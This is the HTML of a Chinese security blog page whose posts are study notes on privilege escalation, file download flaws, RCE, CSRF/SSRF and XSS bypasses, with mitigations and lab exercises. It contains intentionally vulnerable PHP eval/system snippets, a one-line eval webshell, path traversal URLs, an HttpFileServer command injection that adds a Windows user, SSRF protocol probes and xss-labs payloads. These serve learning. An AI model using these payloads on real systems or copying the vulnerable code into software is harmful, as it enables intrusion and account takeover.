      <a data-url="http://yoursite.com/2021/11/21/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E-%E9%AA%8C%E8%AF%81%E7%A0%81%E5%92%8Ctoken%E5%AE%89%E5%85%A8%E5%8F%8A%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6/" data-id="ckxin0f6k001cpovj7e446yaw" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-逻辑越权漏洞—-各种越权和数据篡改" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/11/16/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E2%80%94-%E5%90%84%E7%A7%8D%E8%B6%8A%E6%9D%83%E5%92%8C%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9/" class="article-date">
  <time datetime="2021-11-16T13:23:53.000Z" itemprop="datePublished">2021-11-16</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/11/16/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E2%80%94-%E5%90%84%E7%A7%8D%E8%B6%8A%E6%9D%83%E5%92%8C%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9/">逻辑越权漏洞—-各种越权和数据篡改</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="逻辑越权漏洞"><a href="#逻辑越权漏洞" class="headerlink" title="逻辑越权漏洞"></a>逻辑越权漏洞</h3><h4 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h4><p>原理：通过更换的某个 ID 之类的身份标识，从而使 A 账号获取（修改、删除等）B 账号数据。<br>同级别用户的跨越到另一个用户的信息<br>用户A–用户B–用户C–用户D</p>
<h5 id="其他用户名得到的？"><a href="#其他用户名得到的？" class="headerlink" title="其他用户名得到的？"></a>其他用户名得到的？</h5><p>1、从网站评论留言获取<br>2、从账户注册手段获取</p>
<h4 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h4><p>原理：使用低权限身份的账号，发送高权限账号才能有的请求，获得其高权限的操作。<br>从低权限跨越到一个高权限，普通用户享受超级管理员的权限<br>普通用户–&gt;计划专员–&gt;超级查看员–&gt;超级管理员</p>
<p>垂直越权：添加用户或者其他高权限操作<br>前提条件：获取的有关高权限操作的数据包</p>
<h5 id="数据包如何获取："><a href="#数据包如何获取：" class="headerlink" title="数据包如何获取："></a>数据包如何获取：</h5><p>1、普通用户前端界面具有高权限操作的按钮，模拟抓取数据包<br>2、通过网站源码本地搭建去模拟抓取<br>3、盲猜</p>
<h4 id="登录应用功能点安全问题"><a href="#登录应用功能点安全问题" class="headerlink" title="登录应用功能点安全问题"></a>登录应用功能点安全问题</h4><h5 id="检测功能点，危害"><a href="#检测功能点，危害" class="headerlink" title="检测功能点，危害"></a>检测功能点，危害</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.登录点暴力破解</span><br><span class="line">2.HTTP&#x2F;HTTPS 传输--明文与密文传输</span><br><span class="line">3.Cookie脆弱点验证--Cookie的简单验证</span><br><span class="line">4.Session会话固定测试--Session会话未及时清空</span><br><span class="line">5.验证密文比对安全测试--泄露密码加密方式</span><br></pre></td></tr></table></figure>

<h5 id="数据篡改安全问题"><a href="#数据篡改安全问题" class="headerlink" title="数据篡改安全问题"></a>数据篡改安全问题</h5><p>原理，检测，危害，修复等<br>参考：<a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/67080.html">https://www.secpulse.com/archives/67080.html</a></p>
<h5 id="商品购买流程："><a href="#商品购买流程：" class="headerlink" title="商品购买流程："></a>商品购买流程：</h5><p>选择商品和数量-选择支付及配送方式-生成订单编号-订单支付选择-完成支付</p>
<h5 id="常见篡改参数："><a href="#常见篡改参数：" class="headerlink" title="常见篡改参数："></a>常见篡改参数：</h5><p>商品编号 ID，购买价格，购买数量，订单号，支付状态等</p>
<h5 id="修复防御方案"><a href="#修复防御方案" class="headerlink" title="修复防御方案"></a>修复防御方案</h5><p>1.前后端同时对用户输入信息进行校验，双重验证机制<br>2.调用功能前验证用户是否有权限调用相关功能<br>3.执行关键操作前必须验证用户身份，验证用户是否具备操作数据的权限<br>4.直接加密资源ID，防止攻击者枚举ID，敏感数据特殊化处理<br>5.永远不要相信来自用户的输入，对于可控参数进行严格的检查与过滤</p>
<h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p>   Pikachu-本地水平垂直越权演示<br>   墨者靶场-身份认证失效漏洞实战<br>   HTTP/HTTPS 协议密文抓取<br>   Cookie 脆弱点验证修改测试<br>   niushop商场系统商品支付逻辑测试-数量,订单<br>   大米CMS建站系统商品支付逻辑测试-价格,商品</p>
<h4 id="涉及资源"><a href="#涉及资源" class="headerlink" title="涉及资源"></a>涉及资源</h4><p><a target="_blank" rel="noopener" href="https://www.mozhe.cn/bug/detail/eUM3SktudHdrUVh6eFloU0VERzB4Zz09bW96aGUmozhe">https://www.mozhe.cn/bug/detail/eUM3SktudHdrUVh6eFloU0VERzB4Zz09bW96aGUmozhe</a>     身份认证失效漏洞实战<br><a target="_blank" rel="noopener" href="https://github.com/huyuanzhi2/password_brute_dictionary">https://github.com/huyuanzhi2/password_brute_dictionary</a>  爆破字典<br><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1wTcWym1gTZOdZsVtCTxNsw">https://pan.baidu.com/s/1wTcWym1gTZOdZsVtCTxNsw</a>  提取码：dana   CMS靶场</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2021/11/16/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E2%80%94-%E5%90%84%E7%A7%8D%E8%B6%8A%E6%9D%83%E5%92%8C%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9/" data-id="ckxin0f6n001epovj9f21637k" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-文件操作之文件下载读取" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/11/11/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96/" class="article-date">
  <time datetime="2021-11-11T04:52:26.000Z" itemprop="datePublished">2021-11-11</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/11/11/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96/">文件操作之文件下载读取</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h4 id="文件下载，读取"><a href="#文件下载，读取" class="headerlink" title="文件下载，读取"></a>文件下载，读取</h4><p>原理，检测，利用，修复等</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.文件被解析，则是文件包含漏洞</span><br><span class="line">2.显示源代码，则是文件读取漏洞</span><br><span class="line">3.提示文件下载，则是文件下载漏洞</span><br><span class="line">4.文件被删除，则是文件删除漏洞   服务器上的文件能够被删除</span><br></pre></td></tr></table></figure>



<h4 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h4><h5 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><p>白盒测试：代码审计<br>黑盒测试：<br>1、漏扫工具<br>2、公开漏洞<br>3、手工看参数值及功能点(资源下载)</p>
<h5 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h5><p>1、常见文件 - 后台首页日志等可见文件<br>2、敏感文件 - 配置文件(数据库，平台，脚本语言等)<br>        - 各种接口文件<br>       - 密钥信息等文件</p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1/pikachu/vul/unsafedownload/execdownload.php?filename=ai.png">http://127.0.0.1/pikachu/vul/unsafedownload/execdownload.php?filename=ai.png</a><br><a target="_blank" rel="noopener" href="http://127.0.0.1/pikachu/vul/unsafedownload/download/ai.png">http://127.0.0.1/pikachu/vul/unsafedownload/download/ai.png</a><br><a target="_blank" rel="noopener" href="http://127.0.0.1/pikachu/vul/unsafedownload/execdownload.php?filename=../down_nba.php">http://127.0.0.1/pikachu/vul/unsafedownload/execdownload.php?filename=../down_nba.php</a></p>
<h5 id="如何去获取敏感文件"><a href="#如何去获取敏感文件" class="headerlink" title="如何去获取敏感文件"></a>如何去获取敏感文件</h5><p>1、通过扫描工具或者爬虫爬取     御剑、A7kbscan-WebPathBrute<br>2、通过读取其他文件的信息并分析其路径</p>
<h5 id="文件下载漏洞url特点"><a href="#文件下载漏洞url特点" class="headerlink" title="文件下载漏洞url特点"></a>文件下载漏洞url特点</h5><p>文件名、参数值、目录符号<br>read.xxx?filename=<br>down.xxx?filename=<br>readfile.xxx?file=<br>downfile.xxx?file=</p>
<p>&amp;readpath=、&amp;filepath=、&amp;path=、&amp;inputfile=、&amp;url=、&amp;data=、&amp;readfile=、&amp;menu=、META-INF= 、WEB-INF</p>
<p>../   ..\    .\    ./  等<br>%00  ?  %23  %20 等</p>
<h5 id="各种协议调用配合"><a href="#各种协议调用配合" class="headerlink" title="各种协议调用配合"></a>各种协议调用配合</h5><h5 id="Javaweb-文件下载代码"><a href="#Javaweb-文件下载代码" class="headerlink" title="Javaweb 文件下载代码"></a>Javaweb 文件下载代码</h5><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Cheng_May/article/details/78600833">https://blog.csdn.net/Cheng_May/article/details/78600833</a></p>
<p>&lt;%@ page language=”java” import=”java.util.*” pageEncoding=”UTF-8”%&gt;<br>&lt;%<br>String path = request.getContextPath();<br>String basePath =<br>request.getScheme()+”://“+request.getServerName()+”:”+request.getServerPort()+path+”/“;<br>%&gt;</p>
<p><a href="/download/DownloadServlet?filename=1.jpg">文件下载</a><br>public void doGet(HttpServletRequest request, HttpServletResponse response)<br>throws ServletException, IOException {<br>response.setCharacterEncoding(“UTF-8”);<br>//设置 ContentType 字段值<br>response.setContentType(“text/html;charset=utf-8”);<br>//获取所要下载的文件名称<br>String filename = request.getParameter(“filename”);<br>//下载文件所在目录<br>String folder = “/filename/“;<br>//通知浏览器以下载的方式打开response.addHeader(“Content-type”, “appllication/octet-stream”);<br>response.addHeader(“Content-Disposition”, “attachment;filename=”+filename);<br>//通知文件流读取文件<br>InputStream in = getServletContext().getResourceAsStream(folder+filename);<br>//获取 response 对象的输出流<br>OutputStream out = response.getOutputStream();<br>byte[] buffer = new byte[1024];<br>int len;<br>//循环取出流中的数据<br>while((len = in.read(buffer)) != -1){<br>out.write(buffer,0,len);</p>
<p>}<br>}</p>
<h4 id="涉及案例"><a href="#涉及案例" class="headerlink" title="涉及案例"></a>涉及案例</h4><p> Pikachu文件下载漏洞原理演示<br> zdns真实网站文件下载测试-功能点   <a target="_blank" rel="noopener" href="https://www.znds.com/">https://www.znds.com/</a><br> RoarCTF2019-Easy Java-文件下载读取真题复现<br>    七日情侣真实网站渗透测试   <a target="_blank" rel="noopener" href="http://www.danhaoteng.com/">http://www.danhaoteng.com</a><br> 小米路由器-文件读取真实测试-漏洞</p>
<h4 id="涉及资源"><a href="#涉及资源" class="headerlink" title="涉及资源"></a>涉及资源</h4><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Cheng_May/article/details/78600833">https://blog.csdn.net/Cheng_May/article/details/78600833</a>  javaWeb文件下载代码<br><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#%5BRoarCTF%202019%5DEasy%20Java">https://buuoj.cn/challenges#%5BRoarCTF%202019%5DEasy%20Java</a>  CTF考题<br><a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-98122">https://www.seebug.org/vuldb/ssvid-98122</a>   小米路由器远程任意文件读取漏洞</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2021/11/11/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96/" data-id="ckxin0f6i0018povj0ih4fnq7" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-RCE代码命令执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/11/04/RCE%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2021-11-04T14:53:00.000Z" itemprop="datePublished">2021-11-04</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/11/04/RCE%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">RCE代码命令执行漏洞</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h4 id="RCE代码及命令执行漏洞"><a href="#RCE代码及命令执行漏洞" class="headerlink" title="RCE代码及命令执行漏洞"></a>RCE代码及命令执行漏洞</h4><p>RCE(remote code/command execute)  远程代码/命令执行漏洞</p>
<p>如何产生：在 Web 应用中有时候程序员为了考虑灵活性、简洁性，会在代码调用代码或命令执行函数去处理。比如当应用在调用一些能将字符串转化成代码的函数时，没有考虑用户是否能控制这个字符串，将造成代码执行漏洞。同样调用系统命令处理，将造成命令执行漏洞。</p>
<h4 id="RCE漏洞危害"><a href="#RCE漏洞危害" class="headerlink" title="RCE漏洞危害"></a>RCE漏洞危害</h4><p>1、执行系统命令(Windows：DOS命令、linux)<br>2、执行脚本代码(php、java、python)</p>
<h4 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h4><h5 id="RCE-漏洞产生相关性函数"><a href="#RCE-漏洞产生相关性函数" class="headerlink" title="RCE 漏洞产生相关性函数"></a>RCE 漏洞产生相关性函数</h5><p>PHP eval()函数<br>作用：把字符串按照PHP代码来计算</p>
<?php
$code=$_GET['x'];
eval($code); 
?>

<p>PHP system()函数<br>作用：执行外部程序，并显示输出<br>外部程序：操作系统与环境<br>执行的代码以系统的命令为主</p>
<?php
$code=$_GET['x'];
echo system($code); 
?>

<p>?id=1</p>
<h5 id="漏洞形成条件：可控变量、漏洞函数"><a href="#漏洞形成条件：可控变量、漏洞函数" class="headerlink" title="漏洞形成条件：可控变量、漏洞函数"></a>漏洞形成条件：可控变量、漏洞函数</h5><p>可控变量：基本上是网址上的传参，就是传递参数值来达到改变变量值<br>漏洞函数：使用哪个函数对变量进行操作</p>
<h5 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><p>白盒测试：代码审计<br>黑盒测试：<br>1、漏洞工具–OpenVAS、Nessus等<br>2、公开漏洞–寻找类似目标网站的公开漏洞<br>3、手工看参数值及功能点–判定参数值的数据是否和代码相关</p>
<h5 id="相关防御"><a href="#相关防御" class="headerlink" title="相关防御"></a>相关防御</h5><p>1、变量过滤或固定<br>2、禁用敏感函数<br>3、WAF产品防护</p>
<h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p>​    1、墨者靶场黑盒测试功能点命令执行-命令注入执行分析<br>​    2、墨者靶场白盒代码及命令执行-PHP代码分析溯源-代码分析<br>​    echo <code>$_REQUEST[a]</code><br>​    反引号的作用就是将反引号内的Linux命令先执行,然后将执行结果赋予变量，linux特有<br>​    3、墨者靶场黑盒层 RCE 漏洞检测-公开漏洞<br>​    当前目录、根目录<br>​    4、一句话 Webshell 后门原理代码执行-拓展说明-中国菜刀、冰蝎、蚁剑<br>​                <?php @eval($_POST['xx']);?><br>​    @表示不回显错误结果</p>
<h4 id="涉及资源"><a href="#涉及资源" class="headerlink" title="涉及资源"></a>涉及资源</h4><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/-qing-/p/10819069.html">https://www.cnblogs.com/-qing-/p/10819069.html</a>          RCE漏洞函数<br><a target="_blank" rel="noopener" href="https://www.mozhe.cn/bug/detail/RWpnQUllbmNaQUVndTFDWGxaL0JjUT09bW96aGUmozhe">https://www.mozhe.cn/bug/detail/RWpnQUllbmNaQUVndTFDWGxaL0JjUT09bW96aGUmozhe</a>    命令注入执行分析<br><a target="_blank" rel="noopener" href="https://www.mozhe.cn/bug/detail/T0YyUmZRa1paTkJNQ0JmVWt3Sm13dz09bW96aGUmozhe">https://www.mozhe.cn/bug/detail/T0YyUmZRa1paTkJNQ0JmVWt3Sm13dz09bW96aGUmozhe</a>    PHP代码分析溯源<br><a target="_blank" rel="noopener" href="https://www.mozhe.cn/bug/detail/d01lL2RSbGEwZUNTeThVZ0xDdXl0Zz09bW96aGUmozhe">https://www.mozhe.cn/bug/detail/d01lL2RSbGEwZUNTeThVZ0xDdXl0Zz09bW96aGUmozhe</a>     Webmin未经身份验证的远程代码执行</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2021/11/04/RCE%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="ckxin0f5s0006povj9adm97nr" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-CSRF和SSRF漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/11/01/CSRF%E5%92%8CSSRF%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2021-11-01T08:32:30.000Z" itemprop="datePublished">2021-11-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/11/01/CSRF%E5%92%8CSSRF%E6%BC%8F%E6%B4%9E/">CSRF</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h4 id="CSRF漏洞解释，原理"><a href="#CSRF漏洞解释，原理" class="headerlink" title="CSRF漏洞解释，原理"></a>CSRF漏洞解释，原理</h4><p>CSRF（Cross-site request forgery）跨站请求伪造，也被称为“One Click Attack”或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。</p>
<p>原理：</p>
<p>CSRF攻击攻击原理及过程如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> 用户打开浏览器，访问受信任银行网站，输入用户名和密码请求登录网站；</span><br><span class="line"><span class="number">2.</span>在用户信息通过验证后，银行网站产生Cookie信息并返回给浏览器，此时用户登录网站成功，可以正常发送请求到网站；</span><br><span class="line"><span class="number">3.</span> 用户未退出银行网站之前，在同一浏览器中，打开一个TAB页访问其他网站B</span><br><span class="line"><span class="number">4.</span> 这时候网站B 已被黑客注入诱导信息，加入是一张图片,图片地址指向</span><br><span class="line">  src=”http:<span class="comment">//bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=黑客</span></span><br><span class="line">  点击之后转账给黑客这个账户</span><br><span class="line"><span class="number">5.</span> 浏览器在接收到这些攻击性代码请求后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，根据用户的Cookie信息以C的权限处理该请求，导致来自黑客请求恶意代码被执行。 </span><br></pre></td></tr></table></figure>

<p>这是原理, 攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等。</p>
<p>参考：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/ffb99fc70646">https://www.jianshu.com/p/ffb99fc70646</a></p>
<h4 id="防御方案"><a href="#防御方案" class="headerlink" title="防御方案"></a>防御方案</h4><p>1、当用户发送重要的请求时需要输入原始密码<br>2、设置随机Token<br>3、检验 referer 来源，请求时判断请求链接是否为当前管理员正在使用的页面（管理员在编辑文章，黑客发来恶意的修改密码链接，因为修改密码页面管理员并没有在操作，所以攻击失败）<br>4、设置验证码<br>5、限制请求方式只能为 POST</p>
<h5 id="随机token"><a href="#随机token" class="headerlink" title="随机token"></a>随机token</h5><p>Token是服务端生成的一串字符串，以作客户端进行请求的一个令牌，当第一次登录后，服务器生成一个Token便将此Token返回给客户端，以后客户端只需带上这个Token前来请求数据即可，无需再次带上用户名和密码。</p>
<h4 id="SSRF漏洞解释，原理"><a href="#SSRF漏洞解释，原理" class="headerlink" title="SSRF漏洞解释，原理"></a>SSRF漏洞解释，原理</h4><p>参考：<a target="_blank" rel="noopener" href="https://www.t00ls.net/articles-41070.html">https://www.t00ls.net/articles-41070.html</a></p>
<p>SSRF(Server-Side Request Forgery 服务器请求伪造)<br>目标：从外网无法访问的内部系统<br>形成原因：服务端提供了从其他服务器获取信息的功能，但没有对内网目标地址做过滤与限制<br>挖掘：从web功能上寻找   参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/kuiguowei/article/details/79070999">https://blog.csdn.net/kuiguowei/article/details/79070999</a><br>    1)分享:通过URL地址分享网页内容<br>    2)转码服务: 通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览   <a target="_blank" rel="noopener" href="http://101.201.64.215:8088/">http://101.201.64.215:8088/</a><br>    3)在线翻译:通过URL地址翻译对应文本的内容。提供此功能的国内公司有百度、有道等<br>    4)图片加载与下载: 通过URL地址加载或下载图片<br>    5)图片、文章收藏功能<br>    6)未公开的api实现以及其他调用URL的功能</p>
<p>私有地址：<br>10.0.0.0 - 10.255.255.255<br>172.16.0.0 - 172.31.255.255<br>192.168.0.0 - 192.168.255.255</p>
<h5 id="上传图片、视频方式"><a href="#上传图片、视频方式" class="headerlink" title="上传图片、视频方式"></a>上传图片、视频方式</h5><p>1、本地上传<br>2、远程上传</p>
<h5 id="利用各种协议进行探针："><a href="#利用各种协议进行探针：" class="headerlink" title="利用各种协议进行探针："></a>利用各种协议进行探针：</h5><p><a target="_blank" rel="noopener" href="http://192.168.80.134/phpmyadmin/">http://192.168.80.134/phpmyadmin/</a><br>file://C:/<a target="_blank" rel="noopener" href="http://www.txt/">www.txt</a><br>dict://192.168.80.134:3306/info<br><a href="ftp://192.168.80.134/">ftp://192.168.80.134:21</a></p>
<h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p>​    Pikachu-CSRF实验<br>​    Pikachu-CSRF防御-token测试<br>​    SSRF漏洞本地靶场演示_HttpFileServer应用测试<br>​    参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_30527323/article/details/94862967">https://blog.csdn.net/weixin_30527323/article/details/94862967</a><br>​    <a target="_blank" rel="noopener" href="http://192.168.80.134:8080/?search==%00%7B.exec%7Ccmd.exe">http://192.168.80.134:8080/?search==%00{.exec|cmd.exe</a> /c net user test1234 1234 /add.}</p>
<h4 id="涉及资源"><a href="#涉及资源" class="headerlink" title="涉及资源"></a>涉及资源</h4><p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/ffb99fc70646">https://www.jianshu.com/p/ffb99fc70646</a>   CSRF漏洞原理<br><a target="_blank" rel="noopener" href="https://www.t00ls.net/articles-41070.html">https://www.t00ls.net/articles-41070.html</a>    SSRF漏洞</p>
<p>本地测试代码：</p>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<form action="" method="POST">
请输入图片地址：<input type='text' name='url'>
<input type='submit' value="提交">
</form>
<?php
$_POST['url'];
$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $_POST['url']);
curl_setopt($ch, CURLOPT_HEADER, false);
curl_exec($ch);
curl_close($ch);
?>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2021/11/01/CSRF%E5%92%8CSSRF%E6%BC%8F%E6%B4%9E/" data-id="ckxin0f5o0001povj6ajl67l7" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-xss漏洞-过滤绕过及工具使用" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/10/29/xss%E6%BC%8F%E6%B4%9E-%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%E5%8F%8A%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" class="article-date">
  <time datetime="2021-10-29T06:55:11.000Z" itemprop="datePublished">2021-10-29</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/10/29/xss%E6%BC%8F%E6%B4%9E-%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%E5%8F%8A%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">xss漏洞-过滤绕过及工具使用</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h4 id="简单介绍Beef工具"><a href="#简单介绍Beef工具" class="headerlink" title="简单介绍Beef工具"></a>简单介绍Beef工具</h4><p>Broser：主要是针对浏览器的一些信息收集或攻击，其下的子选项卡Hooked Domain主要是获取HTTP属性值，比如cookie、表单值等，还可以做写简单的浏览器操作，比如替换href值，弹出警告框，重定向浏览器等。这个选项卡下的有些模块会根据受害者的浏览器来决定是否显示。主要是浏览器通用操作和其他基本信息检测。<br>Chrome extensions：主要是针对谷歌浏览器扩展插件<br>Debug：调试功能<br>Exploits：漏洞利用，主要利用一些已公开的漏洞进行攻击测试<br>Host：针对主机，比如检测主机的浏览器、系统信息、IP地址、安装软件等等<br>IPEC：协议间通信。主要是用来连接、控制受害者浏览器的<br>Metasploit：Beef可通过配置和metasploit平台联合，一旦有受害者出现，可通过信息收集确定是否存在漏洞，进一步方便metasploit攻击测试<br>Misc：杂项。<br>Network：网络扫描<br>Persistence：维护受害者访问<br>Phonegap：手机测试<br>Social engineering：社会工程学攻击</p>
<p>其中：<br>绿色模块：可以执行且目标不可见<br>红色模块：不适合当前目标<br>橙色模块：可以执行但目标可见<br>灰色模块：未在目标浏览器上测试过</p>
<p>配置文件：/usr/share/beef-xss/config.yaml<br>  Get Cookie、Redirect Browser(跳转)、Fake Flash Update(图片伪造下载)</p>
<p><a target="_blank" rel="noopener" href="https://www.wangan.com/docs/815">https://www.wangan.com/docs/815</a>  beef模块说明</p>
<h4 id="HttpOnly-属性过滤防读取"><a href="#HttpOnly-属性过滤防读取" class="headerlink" title="HttpOnly 属性过滤防读取"></a>HttpOnly 属性过滤防读取</h4><p>如果cookie中设置了HttpOnly属性，那么通过js脚本将无法读取到cookie信息，这样能有效的防止XSS攻击</p>
<h4 id="登录后台的方式"><a href="#登录后台的方式" class="headerlink" title="登录后台的方式"></a>登录后台的方式</h4><p>1、直接登录<br>2、采用cookie登录</p>
<h4 id="绕过-httponly："><a href="#绕过-httponly：" class="headerlink" title="绕过 httponly："></a>绕过 httponly：</h4><p>1、浏览器保存帐号密码：浏览器读取帐号密码<br>2、浏览器未保存帐号密码：利用表单劫持</p>
<p>参考：<a target="_blank" rel="noopener" href="https://woj.app/1684.html">https://woj.app/1684.html</a></p>
<h4 id="代码类过滤：xsslabs"><a href="#代码类过滤：xsslabs" class="headerlink" title="代码类过滤：xsslabs"></a>代码类过滤：xsslabs</h4><script>alert(1)</script>
<p>onclick=”alert(1)”<br><a href="javascript:alert(1)"></p>
<p>less-2：”&gt;<script>alert(1)</script><br>less-3：’ onclick=’alert(1)<br>less-4：”onclick=”alert(1)”<br>less-5：”&gt;<a href="javascript:alert(1)"><br>less-6：”&gt;<a hRef="javascript:alert(1)"><br>less-7：” oonnclick=”alert(1)”<br>less-8：&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;<br>less-9：&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;//http://<br>less-10：?keyword=111&amp;t_sort=” onclick=”alert(1)”  将type改成text<br>less-11：?keyword=good job!&amp;t_sort=” onclick=”alert(1)” 将type改成text</p>
<h4 id="涉及资源"><a href="#涉及资源" class="headerlink" title="涉及资源"></a>涉及资源</h4><p><a target="_blank" rel="noopener" href="https://github.com/do0dl3/xss-labs">https://github.com/do0dl3/xss-labs</a><br><a target="_blank" rel="noopener" href="https://www.wangan.com/docs/815">https://www.wangan.com/docs/815</a>    beef模块说明</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2021/10/29/xss%E6%BC%8F%E6%B4%9E-%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%E5%8F%8A%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" data-id="ckxin0f69000vpovjfczbcgp5" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
  </nav>

